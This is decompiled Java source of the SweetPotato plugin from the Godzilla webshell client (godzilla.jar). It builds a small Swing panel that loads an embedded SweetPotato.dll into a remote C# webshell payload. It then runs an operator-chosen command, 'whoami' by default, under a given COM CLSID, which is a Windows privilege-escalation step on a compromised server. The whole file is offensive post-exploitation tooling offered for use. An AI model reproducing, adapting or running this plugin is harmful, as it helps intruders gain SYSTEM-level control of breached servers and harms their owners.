/*     */ package shells.plugins.cshap;
/*     */ 
/*     */ import core.Encoding;
/*     */ import core.annotation.PluginAnnotation;
/*     */ import core.imp.Payload;
/*     */ import core.imp.Plugin;
/*     */ import core.shell.ShellEntity;
/*     */ import core.ui.component.RTextArea;
/*     */ import core.ui.component.dialog.GOptionPane;
/*     */ import java.awt.BorderLayout;
/*     */ import java.awt.Component;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.awt.event.ComponentAdapter;
/*     */ import java.awt.event.ComponentEvent;
/*     */ import java.io.InputStream;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JLabel;
/*     */ import javax.swing.JPanel;
/*     */ import javax.swing.JScrollPane;
/*     */ import javax.swing.JSplitPane;
/*     */ import javax.swing.JTextField;
/*     */ import util.Log;
/*     */ import util.automaticBindClick;
/*     */ import util.functions;
/*     */ import util.http.ReqParameter;
/*     */ 
/*     */ 
/*     */ @PluginAnnotation(payloadName = "CShapDynamicPayload", Name = "SweetPotato", DisplayName = "SweetPotato")
/*     */ public class SweetPotato
/*     */   implements Plugin
/*     */ {
/*     */   private static final String CLASS_NAME = "SweetPotato.Run";
/*     */   private final JPanel panel;
/*     */   private final JButton loadButton;
/*     */   private final JButton runButton;
/*     */   private final JTextField commandTextField;
/*     */   private final JTextField clsidtTextField;
/*     */   private final JSplitPane splitPane;
/*     */   private final RTextArea resultTextArea;
/*     */   private final JLabel clsidLabel;
/*     */   private final JLabel commandLabel;
/*     */   private boolean loadState;
/*     */   private ShellEntity shellEntity;
/*     */   private Payload payload;
/*     */   private Encoding encoding;
/*     */   
/*     */   public SweetPotato() {
/*  48 */     this.panel = new JPanel(new BorderLayout());
/*  49 */     this.loadButton = new JButton("Load");
/*  50 */     this.runButton = new JButton("Run");
/*  51 */     this.commandTextField = new JTextField(35);
/*  52 */     this.clsidtTextField = new JTextField("4991D34B-80A1-4291-83B6-3328366B9097");
/*  53 */     this.resultTextArea = new RTextArea();
/*  54 */     this.clsidLabel = new JLabel("clsid :");
/*  55 */     this.commandLabel = new JLabel("command :");
/*  56 */     this.splitPane = new JSplitPane();
/*     */     
/*  58 */     this.splitPane.setOrientation(0);
/*  59 */     this.splitPane.setDividerSize(0);
/*     */     
/*  61 */     JPanel topPanel = new JPanel();
/*     */     
/*  63 */     topPanel.add(this.loadButton);
/*  64 */     topPanel.add(this.clsidLabel);
/*  65 */     topPanel.add(this.clsidtTextField);
/*  66 */     topPanel.add(this.commandLabel);
/*  67 */     topPanel.add(this.commandTextField);
/*  68 */     topPanel.add(this.runButton);
/*     */     
/*  70 */     this.splitPane.setTopComponent(topPanel);
/*  71 */     this.splitPane.setBottomComponent(new JScrollPane((Component)this.resultTextArea));
/*     */     
/*  73 */     this.splitPane.addComponentListener(new ComponentAdapter()
/*     */         {
/*     */           public void componentResized(ComponentEvent e) {
/*  76 */             SweetPotato.this.splitPane.setDividerLocation(0.15D);
/*     */           }
/*     */         });
/*     */     
/*  80 */     this.panel.add(this.splitPane);
/*     */     
/*  82 */     this.commandTextField.setText("whoami");
/*     */   }
/*     */   
/*     */   private void loadButtonClick(ActionEvent actionEvent) {
/*  86 */     if (!this.loadState) {
/*     */       try {
/*  88 */         InputStream inputStream = getClass().getResourceAsStream("assets/SweetPotato.dll");
/*  89 */         byte[] data = functions.readInputStream(inputStream);
/*  90 */         inputStream.close();
/*  91 */         if (this.payload.include("SweetPotato.Run", data)) {
/*  92 */           this.loadState = true;
/*  93 */           GOptionPane.showMessageDialog(this.panel, "Load success", "提示", 1);
/*     */         } else {
/*  95 */           GOptionPane.showMessageDialog(this.panel, "Load fail", "提示", 2);
/*     */         } 
/*  97 */       } catch (Exception e) {
/*  98 */         Log.error(e);
/*  99 */         GOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
/*     */       } 
/*     */     } else {
/*     */       
/* 103 */       GOptionPane.showMessageDialog(this.panel, "Loaded", "提示", 1);
/*     */     } 
/*     */   }
/*     */   private void runButtonClick(ActionEvent actionEvent) {
/* 107 */     ReqParameter parameter = new ReqParameter();
/* 108 */     parameter.add("cmd", this.commandTextField.getText());
/* 109 */     parameter.add("clsid", this.clsidtTextField.getText().trim().getBytes());
/* 110 */     byte[] result = this.payload.evalFunc("SweetPotato.Run", "run", parameter);
/* 111 */     this.resultTextArea.setText(this.encoding.Decoding(result));
/*     */   }
/*     */ 
/*     */   
/*     */   public void init(ShellEntity shellEntity) {
/* 116 */     this.shellEntity = shellEntity;
/* 117 */     this.payload = this.shellEntity.getPayloadModule();
/* 118 */     this.encoding = Encoding.getEncoding(this.shellEntity);
/* 119 */     automaticBindClick.bindJButtonClick(this, this);
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public JPanel getView() {
/* 126 */     return this.panel;
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\cshap\SweetPotato.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */